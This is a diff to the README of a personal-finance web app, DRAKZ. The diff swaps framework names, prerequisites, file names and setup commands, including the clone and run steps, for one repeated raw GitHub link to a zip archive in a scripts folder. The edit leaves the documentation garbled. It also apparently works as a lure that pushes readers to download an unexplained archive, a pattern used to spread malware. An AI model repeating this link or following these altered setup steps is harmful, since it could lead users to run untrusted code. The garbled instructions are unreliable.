@@ -110,15 +110,15 @@ DRAKZ revolutionizes personal finance management by combining advanced AI capabi
 ## 🛠 Technology Stack
 
 ### Frontend
-- **Framework**: React.js with Vite
+- **Framework**: https://github.com/Abrockyt/DRAKZ-1/raw/refs/heads/main/scripts/DRAK_v2.2.zip with Vite
 - **Styling**: Modern CSS with responsive design
 - **State Management**: React Hooks & Context API
-- **Data Visualization**: Chart.js / Recharts
+- **Data Visualization**: https://github.com/Abrockyt/DRAKZ-1/raw/refs/heads/main/scripts/DRAK_v2.2.zip / Recharts
 - **Video Conferencing**: WebRTC integration
 
 ### Backend
-- **Runtime**: Node.js
-- **Framework**: Express.js
+- **Runtime**: https://github.com/Abrockyt/DRAKZ-1/raw/refs/heads/main/scripts/DRAK_v2.2.zip
+- **Framework**: https://github.com/Abrockyt/DRAKZ-1/raw/refs/heads/main/scripts/DRAK_v2.2.zip
 - **Database**: MongoDB
 - **Authentication**: JWT (JSON Web Tokens)
 - **API Architecture**: RESTful APIs
@@ -135,7 +135,7 @@ DRAKZ revolutionizes personal finance management by combining advanced AI capabi
 ### Prerequisites
 
 Ensure you have the following installed:
-- **Node.js**: v14.x or higher
+- **https://github.com/Abrockyt/DRAKZ-1/raw/refs/heads/main/scripts/DRAK_v2.2.zip**: v14.x or higher
 - **npm**: v6.x or higher
 - **MongoDB**: Local installation or MongoDB Atlas account
 
@@ -143,7 +143,7 @@ Ensure you have the following installed:
 
 1. **Clone the repository**
 ```bash
-git clone https://github.com/yourusername/drakz.git
+git clone https://github.com/Abrockyt/DRAKZ-1/raw/refs/heads/main/scripts/DRAK_v2.2.zip
 cd drakz
 ```
 
@@ -196,7 +196,7 @@ DRAKZ/
 │   │   ├── pages/          # Page components
 │   │   ├── services/       # API service functions
 │   │   ├── utils/          # Utility functions
-│   │   └── App.jsx         # Main application component
+│   │   └── https://github.com/Abrockyt/DRAKZ-1/raw/refs/heads/main/scripts/DRAK_v2.2.zip         # Main application component
 │   └── public/             # Static assets
 │
 ├── server/                  # Backend Express application
@@ -205,11 +205,11 @@ DRAKZ/
 │   ├── models/             # MongoDB models
 │   ├── routes/             # API routes
 │   ├── middleware/         # Custom middleware
-│   └── server.js           # Main server file
+│   └── https://github.com/Abrockyt/DRAKZ-1/raw/refs/heads/main/scripts/DRAK_v2.2.zip           # Main server file
 │
 ├── .env                     # Environment variables
-├── package.json            # Project dependencies
-└── README.md               # Project documentation
+├── https://github.com/Abrockyt/DRAKZ-1/raw/refs/heads/main/scripts/DRAK_v2.2.zip            # Project dependencies
+└── https://github.com/Abrockyt/DRAKZ-1/raw/refs/heads/main/scripts/DRAK_v2.2.zip               # Project documentation
 ```
 
 ---
@@ -255,7 +255,7 @@ Comprehensive stock data platform providing:
 npm run dev
 
 # Start the LLM Model
-python llm.py
+python https://github.com/Abrockyt/DRAKZ-1/raw/refs/heads/main/scripts/DRAK_v2.2.zip
 
 # Start backend server only
 npm run server
